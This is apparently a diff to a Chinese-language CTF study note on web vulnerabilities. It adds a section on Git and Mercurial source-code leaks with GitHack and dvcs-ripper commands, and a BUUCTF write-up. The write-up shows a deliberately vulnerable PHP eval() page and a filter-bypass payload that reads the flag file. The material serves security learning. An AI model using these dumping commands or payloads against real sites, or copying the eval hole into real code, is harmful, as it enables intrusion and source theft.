@@ -8,6 +8,7 @@ Web漏洞挖掘的关键：
 - 丰富的知识储备
 更重要的是耐心！
 
+[web短学期专题2](https://cubicy.notion.site/2024-Web-2-3104db564b1f47e9a8310e66582fb5d3#30418ac98bef4c35945d1b0ac64549c9)
 
 [每日推送Bug Bounty相关文章](https://t.me/thebugbountyhunter )
 
@@ -317,6 +318,7 @@ ERROR 1105 (HY000): XPATH syntax error: '~web~'
 ——Джерри Чу
 
 
+
 ## XSS | 跨站脚本攻击
 
 存储型XSS（Stored XSS）：恶意脚本被永久存储在目标服务器上，例如在数据库、留言板、评论区等。当用户浏览含有这些脚本的页面时，脚本会被执行。
@@ -459,6 +461,94 @@ def fetch_url(url):
 
 
 ## 网站扫描
+### 地址泄漏
+[获取网站路径绝对路径的方法汇总 - 看不尽的尘埃 - 博客园](https://www.cnblogs.com/endust/p/12132374.html)
+### 源码泄露
+[常见Web源码泄露总结\_ctf 泄露大全-CSDN博客](https://blog.csdn.net/Fly_hps/article/details/82821857)
+
+**0x1 Hg泄露**
+
+hg init的时候会生成.hg
+
+```shell
+rip-hg.pl -v -u http://www.example.com/.hg/
+```
+
+
+**0x2 Git 泄露**
+在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。
+
+
+**[GitHack](https://github.com/lijiejie/GitHack)**
+
+```shell
+GitHack.py http://www.example.com/.git/
+```
+**dvcs-ripper**
+```shell
+rip-git.pl -v -u http://www.example.com/.git/
+```
+
+!!! note "例题 [git leak](https://zjusec.com/challenges/8)"
+    
+
+!!! note "例题 [BUUCTF 禁止套娃](https://buuoj.cn/challenges#[GXYCTF2019]%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83)"
+
+这道题课上提示是源码泄露,且是git泄露。
+
+那么使用上述的两种方法都可以得到源码
+
+```shell
+GitHack.py http://d0a0f1e7-cbfa-4eee-9a2b-0f067902a20a.node5.buuoj.cn:81/.git/
+```
+
+```shell
+rip-git.pl -v -u http://d0a0f1e7-cbfa-4eee-9a2b-0f067902a20a.node5.buuoj.cn:81/.git/
+```
+
+得到如下的`index.php`文件
+
+```php title="index.php"
+<?php
+include "flag.php";
+echo "flag在哪里呢？<br>";
+if(isset($_GET['exp'])){
+    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
+        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
+            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
+                // echo $_GET['exp'];
+                @eval($_GET['exp']);
+            }
+            else{
+                die("还差一点哦！");
+            }
+        }
+        else{
+            die("再好好想想！");
+        }
+    }
+    else{
+        die("还想读flag，臭弟弟！");
+    }
+}
+// highlight_file(__FILE__);
+?>
+```
+观察这个代码，进行了三次过滤。
+
+- 第一次过滤掉了`data://|filter://|php://|phar://`这些，所以不能使用php伪协议了。
+- 第二次检查是一个正则匹配，询问gpt后，这里是匹配函数调用的意思。
+- 第三次又通过正则检查是否有`et|na|info|dec|bin|hex|oct|pi|log`这些字符
+
+需要注意的是，虽然在第二步检查的时候只剩下`;`，但最终执行的时候还是执行最开始的代码，所以这里不需要担心。
+
+最后构造payload `exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));`
+
+最后得到了flag
+![](https://philfan-pic.oss-cn-beijing.aliyuncs.com/img/20240801184746.png)
+
+
+​    
 ### 备份文件搜索
 网站备份文件的泄露一般是由于网站管理员将网站备份文件或是敏感信息文件存放在某个网站目录下，然后这个目录按照网站的默认设置是可以公开访问的。那么黑客就可通过暴力破解目录的方法获取该备份文件，导致网站敏感信息泄露。
 
